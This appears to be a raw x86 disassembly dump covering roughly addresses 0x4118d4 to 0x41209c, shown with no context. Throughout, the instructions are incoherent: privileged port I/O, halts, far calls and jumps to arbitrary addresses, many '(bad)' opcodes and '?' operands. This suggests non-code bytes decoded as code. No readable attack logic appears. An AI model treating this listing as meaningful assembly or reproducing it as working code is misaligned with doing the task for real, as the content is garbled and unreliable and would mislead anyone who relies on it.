  4118d4:	sbb    eax,0xd6dcedf8
  4118d9:	cli    
  4118da:	pop    ds
  4118db:	rol    DWORD PTR [ebp-0x2],1
  4118de:	and    bh,ah
  4118e0:	lock scas eax,DWORD PTR es:[edi]
  4118e2:	sub    eax,0x629176b2
  4118e7:	lock ret 0xb59d
  4118eb:	sahf   
  4118ec:	mov    dh,0xff
  4118ee:	jmp    0x64a28676
  4118f3:	mov    DWORD PTR [esi],eax
  4118f5:	sub    eax,0x9cae4622
  4118fa:	cdq    
  4118fb:	sahf   
  4118fc:	mov    ebx,ss
  4118fe:	jo     0x41190c
  411900:	loop   0x41195e
  411902:	out    dx,al
  411903:	xor    al,BYTE PTR [edi+ebx*1-0x69]
  411907:	adc    DWORD PTR [eax-0x23],0xffffff8c
  41190b:	xchg   ecx,eax
  41190c:	mov    eax,ds:0x228320ba
  411911:	outs   dx,BYTE PTR ds:[esi]
  411912:	or     DWORD PTR [eax-0xe],edx
  411915:	shl    BYTE PTR [ebp+0x75f13f14],cl
  41191b:	clc    
  41191c:	or     BYTE PTR [ebx-0x47abb89c],0x34
  411923:	push   ebp
  411924:	inc    esp
  411925:	inc    esp
  411926:	js     0x5a9b3054
  41192c:	xchg   ebp,ebx
  41192e:	lods   al,BYTE PTR ds:[esi]
  41192f:	xorps  xmm0,XMMWORD PTR [ebp+0x2d]
  411933:	mov    ebp,0xe1dc116e
  411938:	and    DWORD PTR [ecx-0x2ae11e4b],esi
  41193e:	push   cs
  41193f:	pop    esi
  411940:	es daa 
  411942:	mov    edi,0xf6547619
  411947:	int3   
  411948:	cmc    
  411949:	sbb    ebp,ebx
  41194b:	jns    0x411950
  41194d:	inc    ecx
  41194e:	dec    esi
  41194f:	jb     0x411971
  411951:	ins    BYTE PTR es:[edi],dx
  411952:	jl     0x411918
  411954:	das    
  411955:	in     al,dx
  411956:	clc    
  411957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411958:	test   DWORD PTR [eax],ebx
  41195a:	retf   
  41195b:	into   
  41195c:	shl    DWORD PTR [ebx],cl
  41195e:	push   0x1e
  411960:	fadd   st(1),st
  411962:	sbb    eax,0x708d8838
  411967:	sbb    eax,0x2f52f46e
  41196c:	cli    
  41196d:	imul   esp,DWORD PTR [edi+0x1d5bacad],0x6bda6046
  411977:	jp     0x411994
  411979:	mov    bh,0xea
  41197b:	div    edi
  41197d:	in     eax,0x5a
  41197f:	pop    eax
  411980:	mov    ecx,0x3a8d25af
  411985:	in     eax,0xc1
  411987:	mov    WORD PTR [ebp-0x3a3fc230],?
  41198d:	mov    ebp,0x398afe28
  411992:	fwait
  411993:	arpl   WORD PTR [eax+0x72e5e7c8],ax
  411999:	mov    dh,0xfd
  41199b:	add    eax,0xb5e00661
  4119a0:	adc    eax,0x974a899f
  4119a5:	mov    al,BYTE PTR [ebp+0x38e7fae7]
  4119ab:	mov    ds:0xd0966832,eax
  4119b0:	call   0xc917:0x8651378c
  4119b7:	jo     0x4119aa
  4119b9:	xor    DWORD PTR [edi+0x64],edi
  4119bc:	stos   DWORD PTR es:[edi],eax
  4119bd:	adc    ch,bl
  4119bf:	push   esp
  4119c0:	fdivr  QWORD PTR [ebp+0x2322b536]
  4119c6:	scas   al,BYTE PTR es:[edi]
  4119c7:	xchg   edx,eax
  4119c8:	pop    esp
  4119c9:	push   es
  4119ca:	out    dx,al
  4119cb:	adc    eax,0x7e064ec0
  4119d0:	repnz (bad) 
  4119d3:	sbb    DWORD PTR [ecx],0xbfbade92
  4119d9:	fisttp WORD PTR ds:0x4e07ae48
  4119df:	hlt    
  4119e0:	dec    ebx
  4119e1:	sub    edx,DWORD PTR [ecx]
  4119e3:	test   DWORD PTR ds:0x96e4b80c,ecx
  4119e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ea:	cmp    al,dh
  4119ec:	jg     0x411995
  4119ee:	bound  esp,QWORD PTR [ebx+0x23]
  4119f1:	mov    WORD PTR [ebx-0x10],gs
  4119f4:	adc    ch,cl
  4119f6:	or     DWORD PTR [esi+0x56],edx
  4119f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fc:	(bad)
  4119ff:	fs out 0x7f,al
  411a02:	rol    DWORD PTR [ecx+ecx*2],0x83
  411a06:	jecxz  0x411a57
  411a08:	jno    0x4119a3
  411a0a:	jp     0x4119d8
  411a0c:	je     0x411a07
  411a0e:	mov    WORD PTR [esi-0x1f9e77ef],cs
  411a14:	test   eax,0x6cbcc071
  411a19:	mov    DWORD PTR [ecx],0x64423e72
  411a1f:	add    DWORD PTR [ebx],0xffffffee
  411a22:	jbe    0x4119f9
  411a24:	mov    ebx,0xac311623
  411a29:	lds    ebp,FWORD PTR [ecx]
  411a2b:	xlat   BYTE PTR ds:[ebx]
  411a2c:	dec    edi
  411a2d:	push   esi
  411a2e:	cmp    edx,DWORD PTR [ebp+0x79]
  411a31:	push   ss
  411a32:	push   ds
  411a33:	dec    ecx
  411a34:	sub    eax,0xa191eb3f
  411a39:	int    0xe3
  411a3b:	aaa    
  411a3c:	ins    DWORD PTR es:[edi],dx
  411a3d:	pop    ds
  411a3e:	aas    
  411a3f:	leave  
  411a40:	xchg   esp,eax
  411a41:	push   0x784c2594
  411a46:	jmp    0x4119d3
  411a48:	stos   DWORD PTR es:[edi],eax
  411a49:	fsub   QWORD PTR [ebx+0xd]
  411a4c:	aaa    
  411a4d:	xor    BYTE PTR [eax-0x60],0xec
  411a51:	adc    BYTE PTR [esi+ecx*2],bl
  411a54:	cld    
  411a55:	jmp    0xd0169d17
  411a5a:	ins    BYTE PTR es:[edi],dx
  411a5b:	xchg   esp,eax
  411a5c:	cld    
  411a5d:	adc    BYTE PTR es:[edx],0xa8
  411a61:	clc    
  411a62:	ds push 0xffffffbe
  411a65:	jg     0x411a1c
  411a67:	add    BYTE PTR [esi+edi*2+0x667960f7],dl
  411a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a6f:	mov    eax,ds:0xc2293787
  411a74:	dec    esp
  411a75:	loop   0x411a3c
  411a77:	inc    edi
  411a78:	shl    BYTE PTR fs:[esi+0x73],0x49
  411a7d:	rcr    DWORD PTR [ebp+0x3b75ae15],1
  411a83:	ret    
  411a84:	mov    ebp,0xe5da319d
  411a89:	test   DWORD PTR [ebp-0x51f632fb],0x805baa1c
  411a93:	pop    ds
  411a94:	adc    al,0xac
  411a96:	xor    eax,0x37
  411a99:	outs   dx,BYTE PTR ds:[esi]
  411a9a:	mov    DWORD PTR [eax+0x5],ecx
  411a9d:	shr    BYTE PTR [edi],cl
  411a9f:	pop    ss
  411aa0:	xchg   DWORD PTR [ecx+0x26],edi
  411aa3:	call   0x11aa:0x6a4b51a7
  411aaa:	push   0x7517ed0f
  411aaf:	ret    
  411ab0:	mov    eax,0x194282ef
  411ab5:	push   es
  411ab6:	sbb    eax,0xc8fbc608
  411abb:	ret    
  411abc:	pop    ds
  411abd:	ja     0x411afa
  411abf:	outs   dx,BYTE PTR ds:[esi]
  411ac0:	dec    ecx
  411ac1:	lods   eax,DWORD PTR ds:[esi]
  411ac2:	inc    ebp
  411ac3:	daa    
  411ac4:	test   eax,0x4538520e
  411ac9:	cmp    al,0x94
  411acb:	xor    bh,al
  411acd:	into   
  411ace:	imul   esp,DWORD PTR [edx-0x7e06b857],0x43
  411ad5:	mov    ch,0x93
  411ad7:	cld    
  411ad8:	jne    0x411af0
  411ada:	adc    edi,esi
  411adc:	int3   
  411add:	in     eax,0x1d
  411adf:	push   ebp
  411ae0:	fild   QWORD PTR [ebx-0x19]
  411ae3:	rol    DWORD PTR [ecx-0x7d],cl
  411ae6:	adc    ebx,DWORD PTR [ebp-0x3f]
  411ae9:	std    
  411aea:	addr16 add eax,0x63441413
  411af0:	mov    edx,0x72d76fa8
  411af5:	pushf  
  411af6:	and    edi,DWORD PTR [edx+0x3b]
  411af9:	adc    dh,dl
  411afb:	xchg   ecx,eax
  411afc:	and    eax,0x8938f7f
  411b01:	neg    DWORD PTR [eiz*2-0x201cdc07]
  411b08:	jns    0x411b24
  411b0a:	out    dx,al
  411b0b:	sbb    al,0x95
  411b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b0e:	dec    edi
  411b0f:	(bad)  
  411b10:	sbb    eax,0xbb10cee6
  411b15:	and    bh,BYTE PTR [edi+esi*8-0x3c]
  411b19:	out    dx,al
  411b1a:	mov    al,ss:0xbed2bc38
  411b20:	not    BYTE PTR [eax-0x3662ea74]
  411b26:	or     eax,0x477c4869
  411b2b:	sub    ebx,DWORD PTR [eax+edi*1]
  411b2e:	xchg   esi,eax
  411b2f:	mov    esp,0xad751932
  411b34:	es jo  0x411aed
  411b37:	outs   dx,BYTE PTR ds:[esi]
  411b38:	pcmpeqb mm0,QWORD PTR cs:[ebp-0x45]
  411b3d:	daa    
  411b3e:	lds    edx,FWORD PTR [esi-0x1a]
  411b41:	inc    eax
  411b42:	ret    0x81d2
  411b45:	ss inc ecx
  411b47:	jnp    0x411b8d
  411b49:	mov    bh,0x4c
  411b4b:	loop   0x411bc3
  411b4d:	ds dec edi
  411b4f:	cmp    esi,edx
  411b51:	addr16 push edx
  411b53:	out    dx,eax
  411b54:	jo     0x411b0b
  411b56:	jp     0x411af7
  411b58:	aad    0xf6
  411b5a:	inc    ebp
  411b5b:	cli    
  411b5c:	cli    
  411b5d:	mul    DWORD PTR [eax+0x7a]
  411b60:	cmp    al,0x0
  411b62:	hlt    
  411b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b64:	adc    BYTE PTR [ecx-0x8],ch
  411b67:	pop    eax
  411b68:	sbb    eax,0xbdca5338
  411b6d:	pusha  
  411b6e:	xor    DWORD PTR [esi-0x6b],esp
  411b71:	cld    
  411b72:	shl    BYTE PTR [eax],0xca
  411b75:	das    
  411b76:	cmp    eax,0xf508ca94
  411b7b:	test   al,0xdd
  411b7d:	call   0xc9d97066
  411b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b83:	xchg   ebx,eax
  411b84:	popf   
  411b85:	iret   
  411b86:	xchg   ah,cl
  411b88:	push   edi
  411b89:	es unpcklps xmm3,xmm1
  411b8d:	dec    DWORD PTR [edi]
  411b8f:	xor    ah,bl
  411b91:	xchg   edx,eax
  411b92:	test   BYTE PTR [esi-0x3f],0x54
  411b96:	pop    edi
  411b97:	mov    cl,0xe0
  411b99:	pop    es
  411b9a:	xchg   esp,eax
  411b9b:	sub    eax,0x30dc558b
  411ba0:	rcl    BYTE PTR [ebp-0x34],0x64
  411ba4:	mov    ebp,DWORD PTR [edx-0x1d]
  411ba7:	stos   BYTE PTR es:[edi],al
  411ba8:	enter  0x1da7,0xfa
  411bac:	ins    DWORD PTR es:[edi],dx
  411bad:	mov    ebx,0x1a0dc63d
  411bb2:	scas   eax,DWORD PTR es:[edi]
  411bb3:	xor    eax,0x18c412a1
  411bb8:	or     dh,BYTE PTR [edx+0x37acd00f]
  411bbe:	jnp    0x411b79
  411bc0:	fdivp  st(6),st
  411bc2:	mov    bh,0xb6
  411bc4:	lods   eax,DWORD PTR ds:[esi]
  411bc5:	add    al,0x17
  411bc7:	add    eax,0x8af749ca
  411bcc:	jg     0x411c00
  411bce:	lahf   
  411bcf:	sub    DWORD PTR [edi-0x6a],eax
  411bd2:	ins    DWORD PTR es:[edi],dx
  411bd3:	ror    DWORD PTR [ecx],cl
  411bd5:	jmp    0x411bff
  411bd7:	push   esi
  411bd8:	in     eax,dx
  411bd9:	push   0xff2e400d
  411bde:	test   BYTE PTR [edx+esi*2+0x290a79e],dh
  411be5:	xchg   ecx,eax
  411be6:	fld    QWORD PTR [esi-0x130a9226]
  411bec:	fcom   DWORD PTR [ecx+0x5903df5c]
  411bf2:	mov    ds:0xf44496e5,al
  411bf7:	ins    BYTE PTR es:[edi],dx
  411bf8:	call   0xf905:0x80416ff2
  411bff:	call   DWORD PTR [ebp+0x67]
  411c02:	mov    bh,0xcb
  411c04:	mov    dl,0x28
  411c06:	aad    0x4e
  411c08:	gs xchg esp,eax
  411c0a:	dec    esi
  411c0b:	sbb    eax,0x6bb118f0
  411c10:	std    
  411c11:	push   0xcd448ba6
  411c16:	and    eax,0x2f8e4ac9
  411c1b:	and    BYTE PTR [edx],0x4b
  411c1e:	lods   al,BYTE PTR ds:[esi]
  411c1f:	mov    ?,esi
  411c21:	sub    BYTE PTR [edx+0x8240a6],0x35
  411c28:	cmp    BYTE PTR [ebx],ch
  411c2a:	ss cmp eax,0x82a3a709
  411c30:	repnz pop ecx
  411c32:	xchg   ebp,eax
  411c33:	mov    edx,0xd8d5f927
  411c38:	push   ds
  411c39:	ja     0x411c58
  411c3b:	ins    DWORD PTR es:[edi],dx
  411c3c:	pop    esi
  411c3d:	adc    ecx,DWORD PTR [eax-0x74628dbb]
  411c43:	inc    ecx
  411c44:	add    edi,eax
  411c46:	mov    cl,ah
  411c48:	inc    ebx
  411c49:	mov    al,ds:0xcd21ccd9
  411c4e:	sbb    DWORD PTR [edi+0x57],ebx
  411c51:	cmp    ah,BYTE PTR [edi]
  411c53:	cmc    
  411c54:	adc    BYTE PTR [ebp+0x1b3f2e0c],bh
  411c5a:	push   cs
  411c5b:	mov    esi,0xf99ce8fb
  411c60:	call   FWORD PTR [edi+0x64]
  411c63:	sub    eax,esi
  411c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c66:	xchg   ebp,eax
  411c67:	lahf   
  411c68:	dec    edi
  411c69:	jmp    0x894b409
  411c6e:	int    0xe8
  411c70:	pop    edi
  411c71:	sub    dh,BYTE PTR [ecx]
  411c73:	lods   al,BYTE PTR ds:[esi]
  411c74:	ins    BYTE PTR es:[edi],dx
  411c75:	int3   
  411c76:	add    BYTE PTR [ebx],0x2
  411c79:	aad    0xa0
  411c7b:	pushf  
  411c7c:	mov    ah,BYTE PTR gs:[edi+0x1a]
  411c80:	sub    eax,0xe9d2b57c
  411c85:	into   
  411c86:	push   ss
  411c87:	or     al,0x65
  411c89:	mov    dh,0x69
  411c8b:	retf   0x2ec3
  411c8e:	pusha  
  411c8f:	cmc    
  411c90:	pop    esi
  411c91:	or     cl,dh
  411c93:	aam    0xc7
  411c95:	adc    esi,DWORD PTR [ebx-0x23]
  411c98:	stos   BYTE PTR es:[edi],al
  411c99:	ins    DWORD PTR es:[edi],dx
  411c9a:	and    DWORD PTR [edx-0x6],edi
  411c9d:	mov    cl,0x1e
  411c9f:	or     bl,BYTE PTR [edx+0x4a03c4b5]
  411ca5:	cmp    eax,0x3d69f431
  411caa:	mov    esi,0xaa542a19
  411caf:	scas   al,BYTE PTR es:[edi]
  411cb0:	arpl   WORD PTR [edi+0x8],sp
  411cb3:	dec    ecx
  411cb4:	sub    eax,0xd3a81819
  411cb9:	mov    al,ds:0xdc736adc
  411cbe:	pop    ebx
  411cbf:	faddp  st(4),st
  411cc1:	inc    eax
  411cc2:	cmc    
  411cc3:	mov    BYTE PTR ss:[esi],bh
  411cc6:	inc    esp
  411cc7:	in     al,dx
  411cc8:	lods   al,BYTE PTR ds:[esi]
  411cc9:	(bad)  [edx]
  411ccb:	fdiv   QWORD PTR [eax-0x57a57d36]
  411cd1:	fcmovne st,st(1)
  411cd3:	dec    eax
  411cd4:	test   DWORD PTR [eax-0x35ab8fd1],0x9ab3a57c
  411cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cdf:	popa   
  411ce0:	test   al,0xca
  411ce2:	sbb    DWORD PTR [eax],0x6c
  411ce5:	jg     0x411d4a
  411ce7:	fisub  DWORD PTR [edi]
  411ce9:	test   DWORD PTR [eax-0xfb5d223],0x2f62e218
  411cf3:	jbe    0x411d41
  411cf5:	mov    ebp,DWORD PTR [eax+0x3ab4bce7]
  411cfb:	push   es
  411cfc:	lods   eax,DWORD PTR ds:[esi]
  411cfd:	pop    ss
  411cfe:	nop
  411cff:	in     eax,0xb4
  411d01:	jge    0x411d34
  411d03:	mov    ch,dh
  411d05:	mov    BYTE PTR [ebx-0x3c],bh
  411d08:	retf   0x486a
  411d0b:	push   ecx
  411d0c:	test   eax,0x71c6e45a
  411d11:	dec    eax
  411d12:	mov    ds:0xf202bd6b,eax
  411d17:	mov    ds:0xd7ae828d,eax
  411d1c:	add    ah,cl
  411d1e:	xchg   ebx,eax
  411d1f:	inc    ebx
  411d20:	btr    DWORD PTR [esi],esi
  411d23:	xor    esi,esi
  411d25:	repnz out 0x8d,eax
  411d28:	jnp    0x411d08
  411d2a:	or     BYTE PTR [ecx],cl
  411d2c:	mov    edx,0x36e75cc2
  411d31:	jbe    0x411ce8
  411d33:	stos   DWORD PTR es:[edi],eax
  411d34:	jno    0x411d76
  411d36:	loop   0x411d2e
  411d38:	pop    edx
  411d39:	push   edx
  411d3a:	push   es
  411d3b:	adc    eax,0xc0125410
  411d40:	test   BYTE PTR [ecx+edx*2+0x7d],al
  411d44:	mov    edx,DWORD PTR [ecx-0x3b92d74c]
  411d4a:	fs mov dl,0xa2
  411d4d:	or     dl,BYTE PTR [ecx+0x3ff0919d]
  411d53:	mov    WORD PTR [ecx-0x61234c29],gs
  411d59:	mov    eax,ds:0x197f80f
  411d5e:	inc    ebx
  411d5f:	(bad)  
  411d60:	jge    0x411d35
  411d62:	push   0x91b759ad
  411d67:	cmc    
  411d68:	dec    ecx
  411d69:	push   ds
  411d6a:	mov    dh,0xf8
  411d6c:	sahf   
  411d6d:	daa    
  411d6e:	fdivp  st(6),st
  411d70:	fimul  DWORD PTR [eax]
  411d72:	mov    WORD PTR ss:[esi+0x6a],?
  411d76:	rol    DWORD PTR [edi-0x41],0xb1
  411d7a:	or     DWORD PTR [ebx-0x494dec55],edi
  411d80:	xor    eax,0xf27f473b
  411d85:	aaa    
  411d86:	sub    esp,DWORD PTR [edx+0x42]
  411d89:	into   
  411d8a:	les    eax,FWORD PTR [eax-0xf18a1d]
  411d90:	(bad)  
  411d91:	pusha  
  411d92:	or     eax,DWORD PTR [edi]
  411d94:	call   0xe6030eb
  411d99:	sub    BYTE PTR [ebx-0x3d14fecb],bh
  411d9f:	sbb    DWORD PTR [edi+ebp*2],0xffffffe0
  411da3:	lock dec ecx
  411da6:	mov    al,ds:0xb022207c
  411dab:	test   BYTE PTR ds:0xa201ea2b,ah
  411db1:	test   BYTE PTR [ebx],ah
  411db3:	test   eax,0x3a90cfde
  411db8:	adc    ah,BYTE PTR [edi+0x34a63758]
  411dbe:	daa    
  411dbf:	sbb    eax,0xc1138615
  411dc4:	and    al,0x26
  411dc6:	xor    eax,0x3d550127
  411dcb:	out    dx,al
  411dcc:	pop    edx
  411dcd:	fwait
  411dce:	xchg   ebp,eax
  411dcf:	xor    edx,DWORD PTR [ebp+0x47]
  411dd2:	mov    bl,0xcf
  411dd4:	dec    ebp
  411dd5:	ds push ebp
  411dd7:	inc    ebx
  411dd8:	and    esi,DWORD PTR [esi-0x1f70a9d3]
  411dde:	repz retf 
  411de0:	sbb    BYTE PTR [edx+0x40],al
  411de3:	icebp  
  411de4:	in     eax,dx
  411de5:	adc    al,0x5b
  411de7:	pushf  
  411de8:	mov    al,ds:0x208db03
  411ded:	sbb    dh,BYTE PTR [eax]
  411def:	cld    
  411df0:	in     al,dx
  411df1:	pop    eax
  411df2:	sbb    BYTE PTR [ebp+0x51],0x36
  411df6:	call   0xd7f1:0xfcfcea2f
  411dfd:	call   0x4b02ff36
  411e02:	dec    eax
  411e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e04:	les    edx,FWORD PTR [edx]
  411e06:	and    eax,0x114c0818
  411e0b:	outs   dx,BYTE PTR ds:[esi]
  411e0c:	jns    0x411e3c
  411e0e:	mov    ds:0x52b7be1c,eax
  411e13:	push   ebp
  411e14:	imul   eax,DWORD PTR [ebx],0xffffffe7
  411e17:	adc    dl,BYTE PTR [ebx]
  411e19:	push   esi
  411e1a:	jecxz  0x411dbf
  411e1c:	sbb    BYTE PTR [edx-0x205acf38],ah
  411e22:	ins    BYTE PTR es:[edi],dx
  411e23:	jecxz  0x411e34
  411e25:	mov    WORD PTR [ebx-0x3c],ds
  411e28:	fadd   QWORD PTR [ecx-0x3928a8e7]
  411e2e:	xchg   DWORD PTR [eax],esp
  411e30:	add    bl,dh
  411e32:	and    eax,0xe52d2122
  411e37:	mov    bh,0x84
  411e39:	in     al,dx
  411e3a:	mov    cs,WORD PTR [eax]
  411e3c:	mov    edi,0x34f5e6c5
  411e41:	fsubr  QWORD PTR [esi+edi*4+0xde359ff]
  411e48:	in     eax,dx
  411e49:	in     al,dx
  411e4a:	repz rol BYTE PTR [edx+0x3e],cl
  411e4e:	ret    
  411e4f:	or     esp,DWORD PTR [edi-0x612c4fd8]
  411e55:	repz call 0xc7ac:0xec7a6697
  411e5d:	scas   eax,DWORD PTR es:[edi]
  411e5e:	test   eax,0xee713dde
  411e63:	popf   
  411e64:	sbb    al,0xf2
  411e66:	push   esi
  411e67:	pop    esi
  411e68:	fs jl  0x411e9a
  411e6b:	loop   0x411e55
  411e6d:	and    edi,ecx
  411e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e70:	cmp    BYTE PTR [eax+0x5098b7b9],bh
  411e76:	mov    DWORD PTR [edx+0x549c137a],ecx
  411e7c:	ret    
  411e7d:	xor    edx,esp
  411e7f:	jno    0x411e98
  411e81:	shl    eax,cl
  411e83:	into   
  411e84:	sbb    DWORD PTR [esi+0x7f],edx
  411e87:	nop
  411e88:	mov    esp,0x890965ae
  411e8d:	stos   DWORD PTR es:[edi],eax
  411e8e:	or     dh,BYTE PTR [ecx+0x51a4374e]
  411e94:	pop    eax
  411e95:	ret    
  411e96:	idiv   eax
  411e98:	lahf   
  411e99:	ins    BYTE PTR es:[edi],dx
  411e9a:	test   edi,edx
  411e9c:	lock adc DWORD PTR ds:0x736437c6,esp
  411ea3:	cmp    al,ah
  411ea5:	cmc    
  411ea6:	retf   
  411ea7:	push   ebp
  411ea8:	daa    
  411ea9:	or     esp,ecx
  411eab:	pushf  
  411eac:	into   
  411ead:	lds    edi,FWORD PTR [ecx]
  411eaf:	daa    
  411eb0:	lods   eax,DWORD PTR ds:[esi]
  411eb1:	int3   
  411eb2:	cmp    dh,BYTE PTR [esi-0x65360a9f]
  411eb8:	mov    eax,0xa96eb685
  411ebd:	push   ebp
  411ebe:	in     eax,dx
  411ebf:	pop    ds
  411ec0:	shl    DWORD PTR [edx+0x7de72924],cl
  411ec6:	cmp    DWORD PTR [ecx-0x72],0xfff90ba1
  411ecd:	in     eax,dx
  411ece:	ret    
  411ecf:	(bad)  
  411ed0:	sbb    cl,al
  411ed2:	daa    
  411ed3:	mov    eax,esi
  411ed5:	adc    al,0x98
  411ed7:	les    edi,FWORD PTR [edi]
  411ed9:	mov    ecx,0x43e14ca5
  411ede:	push   ebp
  411edf:	ror    BYTE PTR [edi],cl
  411ee1:	icebp  
  411ee2:	pop    ecx
  411ee3:	mov    esp,?
  411ee5:	sbb    esp,DWORD PTR [ebp-0x5e]
  411ee8:	add    DWORD PTR [eax],edx
  411eea:	cwde   
  411eeb:	leave  
  411eec:	pop    ds
  411eed:	mov    dl,BYTE PTR [edx-0x7cbbba82]
  411ef3:	and    eax,0x81e9e4e4
  411ef8:	into   
  411ef9:	arpl   dx,dx
  411efb:	push   ss
  411efc:	addr16 mov edx,gs
  411eff:	test   DWORD PTR [esi],ecx
  411f01:	fsubr  QWORD PTR [eax+0x7d]
  411f04:	push   ebx
  411f05:	int    0x41
  411f07:	nop
  411f08:	add    BYTE PTR [edi+0x797b299d],bh
  411f0e:	push   edx
  411f0f:	pop    esi
  411f10:	fdiv   QWORD PTR [ebx+0x7d]
  411f13:	push   ecx
  411f14:	pop    ecx
  411f15:	ins    DWORD PTR es:[edi],dx
  411f16:	jbe    0x411f53
  411f18:	in     al,0x81
  411f1a:	jae    0x411ee0
  411f1c:	int    0x94
  411f1e:	pop    ecx
  411f1f:	gs retf 0x591
  411f23:	aaa    
  411f24:	xor    eax,0x91a2a59
  411f29:	enter  0x360d,0xf3
  411f2d:	cld    
  411f2e:	stc    
  411f2f:	fwait
  411f30:	ret    
  411f31:	adc    eax,0x530d6322
  411f36:	push   ebp
  411f37:	out    0xf,eax
  411f39:	nop
  411f3a:	div    DWORD PTR [esi]
  411f3c:	push   0xb060c7d3
  411f41:	jmp    0x45bd5560
  411f46:	mov    dl,BYTE PTR [ebx-0x66]
  411f49:	rcr    ebx,cl
  411f4b:	mov    ch,0x9a
  411f4d:	sbb    cl,dl
  411f4f:	sar    ebx,1
  411f51:	ds mov cl,0x36
  411f54:	cmp    edi,DWORD PTR [ecx-0x442162c4]
  411f5a:	hlt    
  411f5b:	test   DWORD PTR [eax],0x3cd785af
  411f61:	xor    al,0x47
  411f63:	pop    edi
  411f64:	js     0x411eea
  411f66:	test   eax,0xed9ec94c
  411f6b:	out    0x97,al
  411f6d:	jno    0x411f73
  411f6f:	aad    0xfc
  411f71:	jbe    0x411f7a
  411f73:	xchg   edx,eax
  411f74:	mov    ch,BYTE PTR [edi]
  411f76:	sbb    edx,DWORD PTR [ebx-0x55]
  411f79:	clc    
  411f7a:	inc    esi
  411f7b:	mov    WORD PTR [ebp+0x17],cs
  411f7e:	scas   eax,DWORD PTR es:[edi]
  411f7f:	lea    esp,[ebp-0x32]
  411f82:	push   ds
  411f83:	pop    ds
  411f84:	push   edx
  411f85:	stc    
  411f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f87:	shl    BYTE PTR [ebp+0x3c],1
  411f8a:	(bad)  
  411f8b:	ins    BYTE PTR es:[edi],dx
  411f8c:	loop   0x411fce
  411f8e:	mov    ebx,0xddf2f205
  411f93:	cmp    eax,0x676ead3a
  411f98:	push   ecx
  411f99:	sbb    eax,0xf108d0c7
  411f9e:	sbb    ebx,esp
  411fa0:	adc    dh,BYTE PTR [ebx+esi*1-0x1dfdf4c3]
  411fa7:	inc    BYTE PTR [edi]
  411fa9:	in     eax,dx
  411faa:	and    bl,BYTE PTR [esi]
  411fac:	jle    0x411ff4
  411fae:	mov    esi,DWORD PTR [edi+0x3b0b1a4d]
  411fb4:	daa    
  411fb5:	loope  0x412028
  411fb7:	std    
  411fb8:	jae    0x411f44
  411fba:	cmp    eax,0x62a9946c
  411fbf:	pop    ebx
  411fc0:	sbb    eax,0xc5e24e40
  411fc5:	hlt    
  411fc6:	mov    al,ds:0xed052af
  411fcb:	sbb    dh,BYTE PTR [ecx+eax*1+0x596f1079]
  411fd2:	dec    esi
  411fd3:	fbld   TBYTE PTR [ebx]
  411fd5:	push   ebx
  411fd6:	in     eax,0x37
  411fd8:	inc    esp
  411fd9:	sti    
  411fda:	sbb    esi,DWORD PTR [esp+esi*2+0x3ce41494]
  411fe1:	daa    
  411fe2:	jae    0x412054
  411fe4:	jo     0x411f9a
  411fe6:	enter  0x5bb2,0x16
  411fea:	sbb    edx,DWORD PTR [ebp-0x6140b91c]
  411ff0:	lods   eax,DWORD PTR ds:[esi]
  411ff1:	jno    0x41201f
  411ff3:	sti    
  411ff4:	dec    ebx
  411ff5:	into   
  411ff6:	aaa    
  411ff7:	jne    0x41205e
  411ff9:	sbb    al,0x67
  411ffb:	xchg   DWORD PTR [ebx],eax
  411ffd:	je     0x411f9a
  411fff:	icebp  
  412000:	mov    esi,0x4579dd0f
  412005:	ret    
  412006:	push   edi
  412007:	pop    ss
  412008:	test   al,0x89
  41200a:	call   0xb043e707
  41200f:	(bad)  
  412011:	pop    edx
  412012:	xchg   edx,eax
  412013:	cmc    
  412014:	push   0xb7ab8e51
  412019:	cwde   
  41201a:	popf   
  41201b:	out    0xa7,al
  41201d:	or     BYTE PTR [edx+0x6e9d16ab],dl
  412023:	(bad)  
  412024:	or     eax,0x7c89cf2f
  412029:	hlt    
  41202a:	test   al,0x19
  41202c:	jns    0x41207c
  41202e:	and    eax,0x974ab4dd
  412033:	enter  0xb2c7,0x82
  412037:	jb     0x41201a
  412039:	push   ebx
  41203a:	sbb    BYTE PTR [ebx+ebx*4],cl
  41203d:	inc    edi
  41203e:	cs jecxz 0x411ff8
  412041:	addr16 xchg edx,eax
  412043:	fbstp  TBYTE PTR [ebp-0x26aff81a]
  412049:	pop    eax
  41204a:	dec    esp
  41204b:	dec    ebx
  41204c:	mov    ds:0xd690c3b3,eax
  412051:	js     0x411fd4
  412053:	mov    bh,0x49
  412055:	xor    bl,bh
  412057:	in     eax,0x4f
  412059:	xchg   edi,eax
  41205a:	jmp    0xc9f5:0x104f49dc
  412061:	mov    ch,cl
  412063:	fcomp  DWORD PTR [edx+0x3d]
  412066:	in     al,dx
  412067:	in     eax,dx
  412068:	icebp  
  412069:	add    bh,BYTE PTR [edi]
  41206b:	div    DWORD PTR ds:0xc5b59bdd
  412071:	pop    esi
  412072:	daa    
  412073:	jecxz  0x4120b9
  412075:	xchg   BYTE PTR [ecx],bh
  412077:	inc    edx
  412078:	push   0x1f
  41207a:	lahf   
  41207b:	in     al,dx
  41207c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41207d:	in     al,0x8b
  41207f:	push   ecx
  412080:	cmp    BYTE PTR [ebx+0x529dba6e],dh
  412086:	sar    DWORD PTR [esi],0x4d
  412089:	pushf  
  41208a:	in     eax,dx
  41208b:	jb     0x4120d5
  41208d:	push   esi
  41208e:	js     0x412107
  412090:	mov    esi,0xc7d06471
  412095:	xchg   edx,eax
  412096:	mov    esp,0xdf7c15eb
  41209b:	inc    esi
  41209c:	lods   eax,DWORD PTR ds:[esi]
